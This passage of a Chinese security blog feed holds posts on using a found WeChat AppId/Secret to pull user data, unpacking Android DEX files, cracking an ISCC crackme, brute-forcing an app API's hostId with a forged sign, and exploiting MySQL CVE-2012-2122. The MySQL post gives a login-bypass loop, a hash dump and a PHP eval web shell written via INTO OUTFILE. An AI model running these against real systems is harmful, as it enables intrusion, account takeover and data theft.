title="参数说明"></a>参数说明</h5><pre><code>参数                       描述access_token     网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同openid                用户的唯一标识lang             返回国家地区语言版本，zh_CN 简体，zh_TW 繁体，en 英语</code></pre><h5 id="返回说明-2"><a href="#返回说明-2" class="headerlink" title="返回说明"></a>返回说明</h5><pre><code>正确时返回的JSON数据包如下：{&quot;openid&quot;:&quot; OPENID&quot;,   &quot; nickname&quot;: NICKNAME,    &quot;sex&quot;:&quot;1&quot;,    &quot;province&quot;:&quot;PROVINCE&quot;    &quot;city&quot;:&quot;CITY&quot;,    &quot;country&quot;:&quot;COUNTRY&quot;,     &quot;headimgurl&quot;:    &quot;http://wx.qlogo.cn/mmopen/g3MonUZtNHkdmzicIlibx6iaFqAc56vxLSUfpb6n5WKSYVY0ChQKkiaJSgQ1dZuTOgvLLrhJbERQQ4eMsv84eavHiaiceqxibJxCfHe/46&quot;,  &quot;privilege&quot;:[ &quot;PRIVILEGE1&quot; &quot;PRIVILEGE2&quot;     ],    &quot;unionid&quot;: &quot;o6_bmasdasdsad6_2sgVt7hMZOPfL&quot; } </code></pre><h5 id="检验授权凭证（access-token）是否有效"><a href="#检验授权凭证（access-token）是否有效" class="headerlink" title="检验授权凭证（access_token）是否有效"></a><strong>检验授权凭证（access_token）是否有效</strong></h5><pre><code>http：GEThttps://api.weixin.qq.com/sns/auth?access_token=ACCESS_TOKEN&amp;openid=OPENID </code></pre><h5 id="参数说明-3"><a href="#参数说明-3" class="headerlink" title="参数说明"></a>参数说明</h5><pre><code>参数                             描述access_token      网页授权接口调用凭证,注意：此access_token与基础支持的access_token不同openid                    用户的唯一标识    </code></pre><h5 id="返回说明-3"><a href="#返回说明-3" class="headerlink" title="返回说明"></a>返回说明</h5><pre><code>正确的JSON返回结果：{ &quot;errcode&quot;:0,&quot;errmsg&quot;:&quot;ok&quot;} 错误时的JSON返回示例：{ &quot;errcode&quot;:40003,&quot;errmsg&quot;:&quot;invalid openid&quot;}</code></pre><h3 id="10、批量获取用户基本信息"><a href="#10、批量获取用户基本信息" class="headerlink" title="10、批量获取用户基本信息"></a>10、批量获取用户基本信息</h3><h4 id="请求说明"><a href="#请求说明" class="headerlink" title="请求说明"></a>请求说明</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/cgi-bin/user/info/batchget?access_token=ACCESS_TOKEN</code></pre><h4 id="POST数据示例"><a href="#POST数据示例" class="headerlink" title="POST数据示例"></a>POST数据示例</h4><pre><code>{   &quot;user_list&quot;: [       {           &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;,            &quot;lang&quot;: &quot;zh-CN&quot;       },        {           &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;,            &quot;lang&quot;: &quot;zh-CN&quot;       }   ]}</code></pre><h4 id="返回说明-4"><a href="#返回说明-4" class="headerlink" title="返回说明"></a>返回说明</h4><pre><code>{  &quot;user_info_list&quot;: [      {          &quot;subscribe&quot;: 1,           &quot;openid&quot;: &quot;otvxTs4dckWG7imySrJd6jSi0CWE&quot;,           &quot;nickname&quot;: &quot;iWithery&quot;,           &quot;sex&quot;: 1,           &quot;language&quot;: &quot;zh_CN&quot;,           &quot;city&quot;: &quot;Jieyang&quot;,           &quot;province&quot;: &quot;Guangdong&quot;,           &quot;country&quot;: &quot;China&quot;,           &quot;headimgurl&quot;: &quot;http://wx.qlogo.cn/mmopen/xbIQx1GRqdvyqkMMhEaGOX802l1CyqMJNgUzKP8MeAeHFicRDSnZH7FY4XB7p8XHXIf6uJA2SCunTPicGKezDC4saKISzRj3nz/0&quot;,          &quot;subscribe_time&quot;: 1434093047,           &quot;unionid&quot;: &quot;oR5GjjgEhCMJFyzaVZdrxZ2zRRF4&quot;,           &quot;remark&quot;: &quot;&quot;,           &quot;groupid&quot;: 0,          &quot;tagid_list&quot;:[128,2]      },       {          &quot;subscribe&quot;: 0,           &quot;openid&quot;: &quot;otvxTs_JZ6SEiP0imdhpi50fuSZg&quot;,           &quot;unionid&quot;: &quot;oR5GjjjrbqBZbrnPwwmSxFukE41U&quot;,       }  ]}</code></pre><h3 id="11、获取微信公众号用户列表"><a href="#11、获取微信公众号用户列表" class="headerlink" title="11、获取微信公众号用户列表"></a>11、获取微信公众号用户列表</h3><h4 id="调用请求说明"><a href="#调用请求说明" class="headerlink" title="调用请求说明"></a>调用请求说明</h4><pre><code>http请求方式: GET（请使用https协议）https://api.weixin.qq.com/cgi-bin/user/get?access_token=ACCESS_TOKEN&amp;next_openid=NEXT_OPENID</code></pre><h4 id="参数说明-4"><a href="#参数说明-4" class="headerlink" title="参数说明"></a>参数说明</h4><pre><code>参数                    是否必须          说明access_token           是          调用接口凭证next_openid               是         第一个拉取的OPENID，不填默认从头开始拉取</code></pre><h4 id="返回说明-5"><a href="#返回说明-5" class="headerlink" title="返回说明"></a>返回说明</h4><pre><code>正确时返回JSON数据包：{&quot;total&quot;:2,&quot;count&quot;:2,&quot;data&quot;:{&quot;openid&quot;:[&quot;&quot;,&quot;OPENID1&quot;,&quot;OPENID2&quot;]},&quot;next_openid&quot;:&quot;NEXT_OPENID&quot;}</code></pre><h4 id="参数说明-5"><a href="#参数说明-5" class="headerlink" title="参数说明"></a>参数说明</h4><pre><code>参数                  说明total         关注该公众账号的总用户数count         拉取的OPENID个数，最大值为10000data         列表数据，OPENID的列表next_openid     拉取列表的最后一个用户的OPENID</code></pre><h3 id="12、企业新版微信客服"><a href="#12、企业新版微信客服" class="headerlink" title="12、企业新版微信客服"></a>12、企业新版微信客服</h3><h4 id="获取客服基本信息"><a href="#获取客服基本信息" class="headerlink" title="获取客服基本信息"></a><strong>获取客服基本信息</strong></h4><pre><code>http请求方式: GEThttps://api.weixin.qq.com/cgi-bin/customservice/getkflist?access_token=ACCESS_TOKEN</code></pre><h4 id="返回说明-6"><a href="#返回说明-6" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h4><p>返回数据示例（正确时的JSON返回结果）：</p><pre><code>{    &quot;kf_list&quot; : [       {          &quot;kf_account&quot; : &quot;test1@test&quot;,          &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;,          &quot;kf_id&quot; : &quot;1001&quot;,          &quot;kf_nick&quot; : &quot;ntest1&quot;,          &quot;kf_wx&quot; : &quot;kfwx1&quot;       },       {          &quot;kf_account&quot; : &quot;test3@test&quot;,          &quot;kf_headimgurl&quot; : &quot;http://mmbiz.qpic.cn/mmbiz/4whpV1VZl2iccsvYbHvnphkyGtnvjfUS8Ym0GSaLic0FD3vN0V8PILcibEGb2fPfEOmw/0&quot;,          &quot;kf_id&quot; : &quot;1003&quot;,          &quot;kf_nick&quot; : &quot;ntest3&quot;,          &quot;invite_wx&quot; : &quot;kfwx3&quot;,          &quot;invite_expire_time&quot; : 123456789,          &quot;invite_status&quot; : &quot;waiting&quot;       }    ] }</code></pre><h4 id="参数说明-6"><a href="#参数说明-6" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h4><pre><code>参数                                          说明kf_account               完整客服帐号，格式为：帐号前缀@公众号微信号kf_nick                                    客服昵称kf_id                                    客服编号kf_headimgurl                             客服头像kf_wx                     如果客服帐号已绑定了客服人员微信号，则此处显示微信号invite_wx               如果客服帐号尚未绑定微信号，但是已经发起了一个绑定邀请，则此处显示绑定邀请的微信号invite_expire_time        如果客服帐号尚未绑定微信号，但是已经发起过一个绑定邀请，邀请的过期时间，为unix 时间戳invite_status           邀请的状态，有等待确认“waiting”，被拒绝“rejected”，过期“expired”</code></pre><h3 id="13、获取聊天记录"><a href="#13、获取聊天记录" class="headerlink" title="13、获取聊天记录"></a>13、<strong>获取聊天记录</strong></h3><h4 id="调用说明"><a href="#调用说明" class="headerlink" title="调用说明"></a>调用说明</h4><pre><code>http请求方式: POSThttps://api.weixin.qq.com/customservice/msgrecord/getmsglist?access_token=ACCESS_TOKEN</code></pre><h4 id="POST数据示例如下："><a href="#POST数据示例如下：" class="headerlink" title="POST数据示例如下："></a>POST数据示例如下：</h4><pre><code> {    &quot;starttime&quot; : 987654321,    &quot;endtime&quot; : 987654321,    &quot;msgid&quot; : 1,    &quot;number&quot; : 10000}</code></pre><h4 id="参数说明-7"><a href="#参数说明-7" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h4><pre><code>参数                        说明starttime           起始时间，unix时间戳endtime            结束时间，unix时间戳，每次查询时段不能超过24小时msgid               消息id顺序从小到大，从1开始number               每次获取条数，最多10000条</code></pre><h4 id="返回说明-7"><a href="#返回说明-7" class="headerlink" title="返回说明"></a><strong>返回说明</strong></h4><pre><code>{    &quot;recordlist&quot; : [       {          &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;,          &quot;opercode&quot; : 2002,          &quot;text&quot; : &quot; 您好，客服test1为您服务。&quot;,          &quot;time&quot; : 1400563710,          &quot;worker&quot; : &quot;test1@test&quot;       },       {          &quot;openid&quot; : &quot;oDF3iY9WMaswOPWjCIp_f3Bnpljk&quot;,          &quot;opercode&quot; : 2003,          &quot;text&quot; : &quot;你好，有什么事情？&quot;,          &quot;time&quot; : 1400563731,          &quot;worker&quot; : &quot;test1@test&quot;       }    ],     &quot;number&quot;:2,     &quot;msgid&quot;:20165267 }</code></pre><h4 id="参数说明-8"><a href="#参数说明-8" class="headerlink" title="参数说明"></a><strong>参数说明</strong></h4><pre><code>参数                               说明worker                完整客服帐号，格式为：帐号前缀@公众号微信号openid                          用户标识opercode            操作码，2002（客服发送信息），2003（客服接收消息）text                           聊天记录time                      操作时间，unix时间戳</code></pre><p>参考资料：</p><p>1、<a href="https://www.w3cschool.cn/weixinkaifawendang/f5ej1q84.html" target="_blank" rel="noopener">微信公众平台开发概述</a></p><p>2、<a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417674108&amp;token=&amp;lang=zh_CN" target="_blank" rel="noopener">微信开放平台</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在一个偶然的机会获取到了一对微信AppId与Secret，于是整理了一下常用和有用的微信公众号信息获取的接口，以下是部分微信接口调用示例和说明。&lt;/p&gt;
&lt;h3 id=&quot;1、平台开发者获取access-token&quot;&gt;&lt;a href=&quot;#1、平台开发者获取access-tok
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>基于dvmDexFileOpenPartial的动态脱壳</title>
    <link href="/2019/05/%E5%9F%BA%E4%BA%8EdvmDexFileOpenPartial%E7%9A%84%E5%8A%A8%E6%80%81%E8%84%B1%E5%A3%B3/"/>
    <id>/2019/05/基于dvmDexFileOpenPartial的动态脱壳/</id>
    <published>2019-05-15T06:25:33.000Z</published>
    <updated>2019-07-26T09:55:41.915Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、dvmDexFileOpenPartial脱壳原理"><a href="#1、dvmDexFileOpenPartial脱壳原理" class="headerlink" title="1、dvmDexFileOpenPartial脱壳原理"></a>1、dvmDexFileOpenPartial脱壳原理</h3><p>基于libdvm.so下dvmDexFileOpenPartial的文件脱壳，当然如果是新版的加固方式一般不可行，因为会基本会重写dvmDexFileOpenPartial方法。如此，先了解一下libdvm.so的方法dvmDexFileOpenPartial是干什么的。</p><p>加密dex文件在软件运行时，必然会解密加载到内存中运行，而dvmDexFileOpenPartial方法的参数：</p><p>int dvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex)</p><p>第一个参数代表dex文件的基地址，第二个参数代表dex文件的长度，第三个参数代表出参，dex文件的类，方法等信息。</p><p>方法的源码解读：<a href="http://www.blogfshare.com/load-dex-source.html" target="_blank" rel="noopener">从源码看Dex Dump于dvmDexFileOpenPartial原理</a></p><p>断点脱壳原理分析:<a href="https://www.cnblogs.com/jiaoxiake/p/6813127.html" target="_blank" rel="noopener">dvmDexFileOpenPartial断点脱壳原理分析</a></p><p>示例APP：<a href="https://github.com/eternalsakura/ctf_pwn/tree/master/android%E9%80%86%E5%90%91" target="_blank" rel="noopener">jscrack</a></p><p>由于使用的Android 4.4.4的环境，加载模式为Dalvik虚拟机模式，libdvm.so则是此模式下的文件，当然在Android 5.0以上取消了Dalvik模式，自然也不存在libdvm.so文件。dalvik虚拟机会把dex文件优化为odex文件,dvmDexFileOpenPartial则用来解析内存中优化过的dex文件，此时dex已经加载进内存，所以就可以dump出来了。</p><h3 id="2、示例演示"><a href="#2、示例演示" class="headerlink" title="2、示例演示"></a>2、示例演示</h3><p>首先调试模式启动APP，</p><pre><code>adb forward tcp:23946 tcp:23946          #IDA端口转发adb shell am start -D -n 包名/activity名  #调试模式启动APP adb shell ps | grep 包名                  #获取APP的PIDadb forward tcp:8700 jdwp:pid            #进程端口转发</code></pre><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899006483.png" alt="1557899006483"></p><p>然后调整IDA的调试选项，如下：</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899051732.png" alt="1557899051732"></p><p>选择对应的进程后，页面跳转，选择modules下的libdvm.so中的dvmDexFileOpenPartial方法，如下：</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899178517.png" alt="1557899178517"></p><p>找到方法后，在其第一行下断点，如下情形。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899194095.png" alt="1557899194095"></p><p>然后转发jdb。此处jdb不可过早转发，不然下一步运行不到指定地址，将会跳过调试模式进入软件内。</p><pre><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></pre><p>附加完成后可以看到CMD卡在回车处暂无回显，在IDA下运行F9到指定断点处自动下断。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899222926.png" alt="1557899222926"></p><p>单步运行F8一次即可，可以看到寄存器窗口中R0,R1的地址值。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899257190.png" alt="1557899257190"></p><p>在file选项中点击script command运行如下脚本。则可以在D盘下看到dump出来的dex文件。</p><pre><code>static main(void){auto fp, dex_addr, end_addr;fp = fopen(&quot;D:\\dump.dex&quot;, &quot;wb&quot;);end_addr = R0 + R1;for ( dex_addr=R0; dex_addr &lt; end_addr; dex_addr ++ )fputc(Byte(dex_addr), fp);}</code></pre><p>选择jadx打开dex文件，可以看到源码已dump成功。</p><p><img src="\2019\05\基于dvmDexFileOpenPartial的动态脱壳\1557899587774.png" alt="1557899587774"></p><h3 id="3、系统差异"><a href="#3、系统差异" class="headerlink" title="3、系统差异"></a>3、系统差异</h3><p>此处使用Android 4.4.4，如果使用Android 5.0以上不存在lindvm.so，则需要在libart.so中对Openmemory函数下断，同样操作，保存R1,R2的值，R1代表基地址，R2代表长度。</p><p>脚本为</p><pre><code>static main(void){   auto fp, dex_addr, end_addr;   fp = fopen(&quot;D:\\dump.dex&quot;, &quot;wb&quot;);  end_addr = R1 + R2;   for ( dex_addr=R1; dex_addr &lt; end_addr; dex_addr ++ )       fputc(Byte(dex_addr), fp);}</code></pre><p>参考文章：</p><p><a href="https://www.52pojie.cn/thread-778654-1-1.html" target="_blank" rel="noopener">IDA动态调试脱壳步骤</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1、dvmDexFileOpenPartial脱壳原理&quot;&gt;&lt;a href=&quot;#1、dvmDexFileOpenPartial脱壳原理&quot; class=&quot;headerlink&quot; title=&quot;1、dvmDexFileOpenPartial脱壳原理&quot;&gt;&lt;/a&gt;1、dvm
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>ISCC Android Crackme</title>
    <link href="/2019/04/ISCC-Android-Crackme/"/>
    <id>/2019/04/ISCC-Android-Crackme/</id>
    <published>2019-04-30T01:47:32.000Z</published>
    <updated>2019-07-26T09:56:02.225Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ISCC-Android-Crackme"><a href="#ISCC-Android-Crackme" class="headerlink" title="ISCC Android Crackme"></a>ISCC Android Crackme</h3><p>此为2013年ISCC的一道移动题，相对简单的题，懂点 ARM 指令就差不多了。对于新入手安卓逆向可以做做看来练手。要求是注册为企业版程序。以下分析是建立在伪代码基础上，然后分析修改点，修改ARM汇编。</p><p>题目下载：<a href="\2019\04\ISCC-Android-Crackme\crackme.apk">APP</a></p><p>通过反编译代码简单查看功能逻辑，首先是从onCreate函数开始，函数一开始就调用了MyApp的m变量，查看对应的反编译代码。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556518317348.png" alt="1556518317348"></p><p>MyApp是一个native方法的调用，调用了三个方法。</p><p>分别是initSN()、saveSN()、work()。并且执行了initSN方法，因此函数应该是注册码的对比和效验功能。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556518441133.png" alt="1556518441133"></p><p>然后在回到以上的代码执行，点击按钮“执行功能”，进入toast弹出界面，通过判断m值来执行是否触发注册方法，默认为0触发，如果注册成功则调用work()函数来做执行功能。查看doRegister，点击确认后，程序进入com.bfs.crackme1.RegActivity类下，</p><p><img src="\2019\04\ISCC-Android-Crackme\1556519314726.png" alt="1556519314726"></p><p>方法判断是否输入注册码，调用saveSN来保存输入的注册码，然后弹窗关闭自身线程。到此，也基本确认了initSN的方法和上文判断一致。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556520139524.png" alt="1556520139524"></p><p>看完基本的Java层函数现在来看so文件的相关代码实现和流程。</p><p>查看so的一些函数表，可以看到定义了JNI_Onload，Java层执行System.loadLibrary()后，将执行此函数。同样从函数表中可以看出加密处理为MD5。查看JNI_Onload做了什么处理。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556520638909.png" alt="1556520638909"></p><p>查看伪代码，使用RegisterNatives实现JNI，而RegisterNatives是来做什么处理的，可以查看如下文章：</p><p><a href="https://blog.csdn.net/qiuxiaolong007/article/details/7860610" target="_blank" rel="noopener">JNI：使用RegisterNatives方法传递和使用Java自定义类</a></p><p>而此处的作用基本可以看到是用来自定义函数命名，不然native中的函数名为Java_com_bfs_crackme1_MainActivity_initSN这种类型，下面只有n1、n2、n3来代替以上方法。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556520977389.png" alt="1556520977389"></p><p>查看n1方法，读取sdcard下的reg.dat文件，来进行MD5效对，要求进行企业版注册，能看到的是注册成功将使用setValue进行对v1的赋值，其中按照MainActivity文件中的判断，猜测3为企业版MD5值。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556522659413.png" alt="1556522659413"></p><p>n2则为如下，读写的形式来对reg.dat 进行重写。</p><p><img src="\2019\04\ISCC-Android-Crackme\1556524534479.png" alt="1556524534479"></p><p>work函数则为如下：</p><p><img src="\2019\04\ISCC-Android-Crackme\1556525011606.png" alt="1556525011606"></p><p>至此，函数名则分析清楚，n1对应initSN，n2对应saveSN，n3对应work。根据函数流程可以大概猜出判断行为：n2保存来自输入的参数的MD5-&gt;n1读取参数进行对应是否为注册值-&gt;注册成功则set到内存一个值-&gt;由work来读取这个值判断注册是否成功以及功能执行。</p><p>所以理论上说，patch点有如下处：</p><p>1、修改reg.dat为企业版的注册码，修改Java层代码让其不走注册函数。</p><p>2、解密MD5值，直接输入注册</p><p>3、修改n1，让其返回值永远为3</p><p>4、修改work函数获取的v2值。</p><p>修改时，发现第一种并不行，Java层参数值修改后，可能n2做了其他相关处理，第二种是可行，毕竟都获取到了注册码，但需要解密成功，此MD5只是简单的32345678。</p><p>第三种修改n1：</p><p>输入肯定为错误或者不输入值，因此只需要修改值为空或者其他未知情况下的返回值。</p><pre><code>.text:0000133C                 CMP     R0, #0.text:00001340                 MOVEQ   R1, #4.text:00001344                 MOV     R0, R7.text:00001348                 MOVNE   R1, R8</code></pre><p>修改为：</p><pre><code>.text:0000133C                 MOV     R0, #3.text:00001340                 MOVEQ   R1, #3.text:00001344                 MOV     R0, R7.text:00001348                 MOVNE   R1, R8</code></pre><p>让其在未输入的情况下返回企业版的返回值。修改编译安装后，打开即为企业版。</p><p>第四种修改work:</p><pre><code>.text:000014A0 10 40 2D E9                                     STMFD   SP!, {R4,LR}.text:000014A4 00 40 A0 E1                                     MOV     R4, R0.text:000014A8 6F FF FF EB                                     BL      n1.text:000014AC 04 00 A0 E1                                     MOV     R0, R4.text:000014B0 35 FF FF EB                                     BL      getValue.text:000014B8 00 00 50 E3                                     CMP     R0, #0</code></pre><p>增加一条指令，修改为:</p><pre><code>.text:000014A0 10 40 2D E9                                     STMFD   SP!, {R4,LR}.text:000014A4 00 40 A0 E1                                     MOV     R4, R0.text:000014A8 6F FF FF EB                                     BL      n1.text:000014AC 04 00 A0 E1                                     MOV     R0, R4.text:000014B0 35 FF FF EB                                     BL      getValue.text:000014B4 03 00 A0 E3                                     MOV     R0, #3.text:000014B8 00 00 50 E3                                     CMP     R0, #0             </code></pre><p>这样达到从getvalue获取返回值后，重新修改v2的值为3，让其无论什么情况下都自动判断为已注册企业版。</p><p>网上其他的分析文章，同样是修改n1函数，只不过修改方式是同时修改几个mov语句，让其都赋值3来跳转判断。</p><p>详细文章：<a href="http://ju.outofmemory.cn/entry/33818" target="_blank" rel="noopener">简单Android CrackMe分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;ISCC-Android-Crackme&quot;&gt;&lt;a href=&quot;#ISCC-Android-Crackme&quot; class=&quot;headerlink&quot; title=&quot;ISCC Android Crackme&quot;&gt;&lt;/a&gt;ISCC Android Crackme&lt;/h3&gt;&lt;
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>APP解密参数sign</title>
    <link href="/2019/04/APP%E8%A7%A3%E5%AF%86%E5%8F%82%E6%95%B0sign/"/>
    <id>/2019/04/APP解密参数sign/</id>
    <published>2019-04-18T08:34:21.000Z</published>
    <updated>2019-07-26T09:56:16.713Z</updated>
    
    <content type="html"><![CDATA[<h3 id="APP解密参数sign"><a href="#APP解密参数sign" class="headerlink" title="APP解密参数sign"></a>APP解密参数sign</h3><p>APP是公司自己的业务APP，没有加固，只做了代码混淆。本以为要对加密字段进行so文件的逆向，查看后发现是Java层的加密，相对较简单。</p><p>首先抓包查看加密字段和相关参数值，可以看到一共有四个参数，其中sign是加密验证完整性字段</p><p><img src="\2019\04\APP解密参数sign\1555574089554.png" alt="1555574089554"></p><p>利用AK逆向APP包，搜索sign字段信息，但是搜索结果过多，查找较困难，但是sign是一个data参数字段，因此尝试更换其他字段搜索。</p><p><img src="\2019\04\APP解密参数sign\1555574535666.png" alt="1555574535666"></p><p>搜索reqData字段可以看到，搜索结果就smali文件存在，第一个为程序包，查看代码，利用jd来查看反编译Java代码。</p><p><img src="\2019\04\APP解密参数sign\1555574610824.png" alt="1555574610824"></p><p>搜索字段，可以看到如下所示，以下字段可以看出，程序对其四个字段的获取都有代表的变量，而我们只需要获取sign的变量，localObject2。</p><p>变量的值来源为t包的b方法，可以明显看到，值为nonce，tiestamp, localObject1, t.f的相加值。而localObject1为reqData的值。</p><p><img src="\2019\04\APP解密参数sign\1555575022131.png" alt="1555575022131"></p><p>查看t.b的方法，方法如下，对字段进行sha-256加密。查看a方法</p><pre><code>public static String b(String paramString)  {    return a(paramString, &quot;SHA-256&quot;);  }</code></pre><p>其中t.a的执行为对指定的参数进行指定的加密，利用传入参数来确定。</p><pre><code>public static String a(String paramString1, String paramString2)  {    try    {      paramString2 = MessageDigest.getInstance(paramString2);      paramString2.update(paramString1.getBytes());      paramString1 = a(paramString2.digest());      return paramString1;    }    catch (Exception paramString1)    {      paramString1.printStackTrace();    }    return null;  }</code></pre><p>而t.f代表的是一段加密公钥，此处不在列出，利用在线工具查看加密结果是否一致。可以看到加密后的参数和抓到的包结果一致。</p><p><img src="\2019\04\APP解密参数sign\1555575489330.png" alt="1555575489330"></p><p>那么就可以利用我们自己生成加密参数的方式来进行测试，例如如下脚本，通过判断响应返回的字段来获取参数值，查看是否越权等信息。</p><pre><code>#coding : utf-8import hashlibimport requestsheaders = {    &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,    &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,    &#39;Cookie&#39;: &#39;JSESSIONID=xxxxxxx&#39;,    &#39;User-Agent&#39;: &#39;okhttp/3.4.1&#39;}for i in range(60200000, 60295558):    sha = &#39;MIICdgIBADAN.....TMK63hMPgm25mbCD0vKhsQtcSDlzVwtOOoNlW5E8CQQDNXVwGolFCqU9lb5147AHc+&lt;INF&gt;&lt;action&gt;...&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;LE8I2QTAFHJM3M.....1555571421812&#39;    h = hashlib.sha256(sha)    sha256 = h.hexdigest()    data = &#39;reqData=&lt;INF&gt;&lt;action&gt;.....&lt;/action&gt;&lt;hostId&gt;&#39;+str(i)+&#39;&lt;/hostId&gt;&lt;ver&gt;27&lt;/ver&gt;&lt;transNo&gt;1555571421812&lt;/transNo&gt;&lt;deviceType&gt;0&lt;/deviceType&gt;&lt;verNm&gt;3.3.1&lt;/verNm&gt;&lt;/INF&gt;&amp;nonce=LE8I2QTAFHJM3MO.....&amp;timestamp=1555571421812&amp;sign=&#39;+sha256    r = requests.post(&#39;http://xxxxxx/api&#39;, data = data, headers=headers)    if &#39;xxxxxx&#39; in r.text:        print i</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;APP解密参数sign&quot;&gt;&lt;a href=&quot;#APP解密参数sign&quot; class=&quot;headerlink&quot; title=&quot;APP解密参数sign&quot;&gt;&lt;/a&gt;APP解密参数sign&lt;/h3&gt;&lt;p&gt;APP是公司自己的业务APP，没有加固，只做了代码混淆。本以为要对加
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>MySQL历史漏洞分析</title>
    <link href="/2019/04/MySQL%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>/2019/04/MySQL历史漏洞分析/</id>
    <published>2019-04-12T06:05:30.000Z</published>
    <updated>2019-04-12T08:54:58.191Z</updated>
    
    <content type="html"><![CDATA[<h3 id="MySQL历史漏洞分析"><a href="#MySQL历史漏洞分析" class="headerlink" title="MySQL历史漏洞分析"></a>MySQL历史漏洞分析</h3><p>前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使用少，而且是外包托管阿里云，因此并没有影响其他系统。拿到这个系统后，查看端口服务时发现，数据库端口对外开放，ssh对外开放，然后根据对系统的核查，猜测有可能存在以下问题：</p><p>1、后台弱口令或者登陆绕过</p><p>2、mysql弱口令</p><p>3、ssh弱口令爆破</p><p>经过后来优先对外的端口审查，发现是数据库漏洞，MySQL的cve-2012-2122，身份验证漏洞。</p><p>简单的说就是MySQL对身份验证上存在缺陷，大概256次登陆认证就会出现一次认证成功。并不在乎密码的正确性。</p><p>漏洞介绍：</p><pre><code>https://seclists.org/oss-sec/2012/q2/493</code></pre><p>漏洞原因：</p><pre><code>my_bool check_scramble(const uchar *scramble_arg, const char *message,               const uint8 *hash_stage2){  SHA1_CONTEXT sha1_context;  uint8 buf[SHA1_HASH_SIZE];  uint8 hash_stage2_reassured[SHA1_HASH_SIZE];  mysql_sha1_reset(&amp;sha1_context);  /* create key to encrypt scramble */ mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH);  mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE);  mysql_sha1_result(&amp;sha1_context, buf);  /* encrypt scramble */ my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH);  /* now buf supposedly contains hash_stage1: so we can get hash_stage2 */ mysql_sha1_reset(&amp;sha1_context);  mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE);  mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured);  return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE);}</code></pre><p>以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。</p><p>而此漏洞并不是版本通病是MySQL在编译时，需添加-fno-builtin，并且所使用的glibc是经SSE优化后的，只不过glibc是系统自带。</p><p>漏洞利用：</p><pre><code>使用如下poc：for i in `seq 1 1000`; do mysql -u root --password=root -h 127.0.0.1 2&gt;/dev/null; done</code></pre><p>环境采用vulhub的docker环境，测试成功后返回如下：</p><p><img src="\2019\04\MySQL历史漏洞分析\1555050537911.png" alt="1555050537911"></p><p>那么拿到数据库怎么尝试获取服务权限，可以获取数据库账号密码来维持对数据库的访问和root权限。</p><pre><code>select user,password from mysql.user;</code></pre><p><img src="\2019\04\MySQL历史漏洞分析\1555050975845.png" alt="1555050975845"></p><p>MySQL密码加密由sha1加密后再unhex加密再sha1加密的字段，可以再md5等密码查询网站查找。如上密码为123456。</p><p>还可以使用导出的形式，利用如下：</p><pre><code>Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;/var/www/html/a.txt&#39;;  